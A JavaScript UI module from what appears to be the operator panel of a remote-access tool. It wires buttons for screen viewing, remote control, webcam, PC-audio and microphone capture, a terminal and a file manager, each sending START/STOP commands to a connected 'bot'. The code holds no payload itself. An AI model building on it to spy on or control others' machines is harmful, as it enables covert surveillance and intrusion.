// frontend/client_control/js/modules/ui/header.js

import { AppState } from '../core/states.js';

export const initHeaderControls = () => {
  const $ = id => document.getElementById(id);
  
  const actions = [
    { id: 'btn-desktop-stream', ref: AppState.desktop, key: 'observe', mod: 'ScreenView' },
    { id: 'btn-desktop-control', ref: AppState.desktop, key: 'control', mod: 'RemoteControl' },
    { id: 'btn-webcam-stream', ref: AppState.webcam, key: 'active', mod: 'Webcam' },
    { id: 'btn-audio-pc', ref: AppState.audio, key: 'output', mod: 'AudioPulse', extra: 'PC' },
    { id: 'btn-audio-mic', ref: AppState.audio, key: 'input', mod: 'AudioPulse', extra: 'Mic' }
  ];

  const toggleAction = (a, force = null, silent = false) => {
      const btn = $(a.id), state = force ?? !a.ref[a.key];
      if (a.ref[a.key] === state && force === null) return;
      
      a.ref[a.key] = state;
      btn?.classList.toggle('active', state);

      if (a.id === 'btn-desktop-control') {
        const cvs = $('desktopCanvas');
        cvs && Object.assign(cvs.style, { pointerEvents: state ? 'auto' : 'none' });
        state && cvs?.focus();
      }

      if (!silent && window.sendToBot) {
          window.sendToBot(a.mod, "", state ? 'START' : 'STOP', a.extra || 'none');
      }
  };

  const stopAllActivities = () => {
      actions.forEach(a => a.ref[a.key] && toggleAction(a, false));
      ['terminal-overlay', 'files-overlay'].forEach(id => $(id)?.classList.add('hidden'));
      ['btn-terminal-toggle', 'btn-files-toggle'].forEach(id => $(id)?.classList.remove('active'));
  };

  // Динамическое обновление статуса (вызывается из WS connection)
  window.updateBotStatus = (status) => {
      const dot = $('status-indicator'), txt = $('status-text');
      if (!dot || !txt) return;
      const isOnline = status === 'online';
      dot.className = `status-dot ${isOnline ? 'online' : 'offline'}`;
      txt.textContent = status;
      if (!isOnline) stopAllActivities();
  };

  // Авто-стоп при потере фокуса вкладки или закрытии
  document.addEventListener('visibilitychange', () => document.hidden && stopAllActivities());
  window.addEventListener('beforeunload', () => stopAllActivities());

  const setupToggle = (id, ovlId, onOpen) => {
    const btn = $(id), ovl = $(ovlId);
    if (!btn || !ovl) return;
    btn.onclick = () => {
      const isH = ovl.classList.toggle('hidden');
      btn.classList.toggle('active', !isH);
      if (!isH) onOpen?.();
    };
  };

  setupToggle('btn-terminal-toggle', 'terminal-overlay', () => {
    window.resetTerminalPosition?.();
    setTimeout(() => $('terminal-cmd')?.focus(), 50);
  });
  
  setupToggle('btn-files-toggle', 'files-overlay', () => window.openFileManager?.());

  actions.forEach(a => {
    const el = $(a.id);
    if (el) el.onclick = () => toggleAction(a);
  });

  window.syncModeResources = mode => {
    if (mode === 'webcam') { toggleAction(actions[0], false); toggleAction(actions[1], false); }
    else if (mode === 'desktop') { toggleAction(actions[2], false); }
  };
};